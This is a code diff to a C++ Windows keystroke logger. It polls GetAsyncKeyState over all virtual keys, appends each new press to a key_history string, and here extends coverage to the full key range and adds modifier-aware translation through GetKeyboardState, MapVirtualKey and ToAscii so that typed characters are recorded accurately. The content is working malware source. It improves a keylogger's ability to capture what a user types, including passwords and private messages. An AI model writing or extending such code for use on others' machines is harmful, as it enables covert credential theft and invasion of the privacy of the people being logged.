@@ -12,7 +12,7 @@ std::unordered_map<int, int> was_key_down;
 int main(){
     // Initizializing unordered map
     int index_count = 0;
-    for (int key = 0x20; key <= 0x5A; key++){
+    for (int key = 0x08; key <= 0xFF; key++){
         was_key_down[key] = false;
     }
     
@@ -24,15 +24,27 @@ int main(){
             return 0;
         } else {
             // Running through all the keys
-            for (int key = 0x20; key <= 0x5A; key++){
+            for (int key = 0x08; key <= 0xFF; key++){
                 // Checking if this key should be logged
                 if (GetAsyncKeyState(key) & 0x8000){ // Is it pressed? [Yes to continue]
-                    if (was_key_down[key] == false){ // Has the user been keeping it pressed? [No to continue]
+                    if (!was_key_down[key]){ // Has the user been keeping it pressed? [No to continue]
                         // Update the map
                         was_key_down[key] = true;
                         
-                        // Log the key
-                        char helper_c = static_cast<char>(key);
+                        // LOGGING THE KEY
+                        // Getting the status of the key modifiers
+                        BYTE modifier_status[256];
+                        GetKeyboardState(modifier_status);
+
+                        // Getting the hardware scan code for the key
+                        int key_scan_code = MapVirtualKey(key, MAPVK_VK_TO_VSC);
+
+                        // Setting up the output variable
+                        WORD ascii_code;
+                        int result = ToAscii(key, key_scan_code, modifier_status, &ascii_code, 0);
+
+                        // Storing the key into a string.
+                        char helper_c = static_cast<char>(ascii_code);
                         std::string c = std::string(1, helper_c);
                         int str_length = key_history.length();
 
